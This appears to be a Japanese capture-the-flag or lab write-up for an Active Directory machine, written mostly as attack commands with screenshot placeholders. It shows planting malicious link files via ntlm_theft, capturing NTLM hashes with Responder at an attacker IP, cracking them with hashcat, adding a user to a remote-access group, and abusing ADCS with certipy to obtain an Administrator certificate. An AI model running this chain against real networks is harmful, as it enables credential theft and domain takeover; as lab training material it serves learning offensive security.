悪性リンクファイルの作成

└─$ python3 ntlm_theft/ntlm_theft.py -g all -s 192.168.45.231 -f kali

![[wt image 84.png]]

NTLMハッシュ値の待ち受け

└─$ sudo responder -I tun0

![[wt image 85.png]]

![[wt image 86.png]]

![[wt image 87.png]]

└─$ hashcat tracy_hash --show

![[wt image 88.png]]

└─$ hashcat -m 5600 tracy_hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force

![[wt image 89.png]]

zqwj041FGX

└─$ bloodhound-python -c All -u tracy.white -p 'zqwj041FGX' -ns 192.168.145.30 -d nara-security.com  --zip

![[wt image 90.png]]

![[wt image 91.png]]

Remoteメンバーの確認

└─$ net rpc group members "REMOTE ACCESS" -U "DOMAIN"/"TRACY.WHITE"%"zqwj041FGX" -S "192.168.145.30"

![[wt image 92.png]]

==🟢IA==

リモートメンバーに追加

└─$ net rpc group addmem "REMOTE ACCESS" "TRACY.WHITE" -U "DOMAIN"/"TRACY.WHITE"%"zqwj041FGX" -S "192.168.145.30"

![[wt image 93.png]]

![[wt image 94.png]]

PE

脆弱なADCSの確認

![[wt image 95.png]]

\# 管理者ユーザーの証明書の要求

\`\`\`zsh

certipy-ad req -username "TRACY.WHITE" -p "zqwj041FGX" -template NaraUser -dc-ip 192.168.145.30 -ca NARA-CA -upn 'Administrator@nara-security.com' -dns Nara.nara-security.com -debug

\`\`\`

![[wt image 96.png]]

\# 保存された証明書を使用して認証する

\`\`\`zsh

certipy-ad auth -pfx administrator_nara.pfx -dc-ip 192.168.145.30

\`\`\`

![[wt image 97.png]]